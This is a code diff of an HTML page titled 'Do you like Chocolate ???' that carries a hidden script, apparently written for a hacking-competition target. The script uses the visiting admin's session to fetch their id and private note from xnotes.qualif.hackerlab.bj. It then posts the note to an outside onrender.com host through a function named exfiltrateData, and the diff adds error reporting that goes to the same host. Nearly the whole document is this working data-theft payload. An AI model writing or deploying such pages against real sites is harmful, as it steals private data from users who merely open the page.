@@ -8,33 +8,74 @@
 <script>
   function exfiltrateData(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/data", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("data=" + encodeURIComponent(data));
   }
-  
-  // Créer une nouvelle instance de XMLHttpRequest pour récupérer l'admin_id
-  var xhr = new XMLHttpRequest();
-  xhr.open("GET", "https://xnotes.qualif.hackerlab.bj/api.php", true);
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4 && xhr.status == 200) {
-      var response = JSON.parse(xhr.responseText);
-      var adminId = response.id;
-  
-      // Créer une nouvelle instance de XMLHttpRequest pour récupérer le contenu de la note
-      var noteXhr = new XMLHttpRequest();
-      noteXhr.open("GET", "https://xnotes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
-      noteXhr.onreadystatechange = function() {
-        if (noteXhr.readyState == 4 && noteXhr.status == 200) {
-          var noteContent = noteXhr.responseText;
-          exfiltrateData(noteContent);
-        }
-      };
-      noteXhr.send();
-    }
+
+  function reportError(error) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/error", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("error=" + encodeURIComponent(error));
+  }
+
+  // Gestionnaire global pour les erreurs non capturées
+  window.onerror = function(message, source, lineno, colno, error) {
+    var errorDetails = {
+      message: message,
+      source: source,
+      lineno: lineno,
+      colno: colno,
+      error: error ? error.stack : null
+    };
+    reportError(JSON.stringify(errorDetails));
   };
-  xhr.send();
-  </script>
+
+  try {
+    // Créer une nouvelle instance de XMLHttpRequest pour récupérer l'admin_id
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://xnotes.qualif.hackerlab.bj/api.php", true);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4) {
+        if (xhr.status == 200) {
+          try {
+            var response = JSON.parse(xhr.responseText);
+            var adminId = response.id;
+
+            // Créer une nouvelle instance de XMLHttpRequest pour récupérer le contenu de la note
+            var noteXhr = new XMLHttpRequest();
+            noteXhr.open("GET", "https://xnotes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
+            noteXhr.onreadystatechange = function() {
+              if (noteXhr.readyState == 4) {
+                if (noteXhr.status == 200) {
+                  var noteContent = noteXhr.responseText;
+                  exfiltrateData(noteContent);
+                } else {
+                  reportError("Error fetching note: " + noteXhr.statusText);
+                }
+              }
+            };
+            noteXhr.onerror = function() {
+              reportError("Request error fetching note");
+            };
+            noteXhr.send();
+          } catch (e) {
+            reportError("Error parsing response: " + e.message);
+          }
+        } else {
+          reportError("Error fetching admin_id: " + xhr.statusText);
+        }
+      }
+    };
+    xhr.onerror = function() {
+      reportError("Request error fetching admin_id");
+    };
+    xhr.send();
+  } catch (e) {
+    reportError("Error initiating requests: " + e.message);
+  }
+</script>
 <body>
   <h1>Do you like Chocolate ???</h1>
 </body>
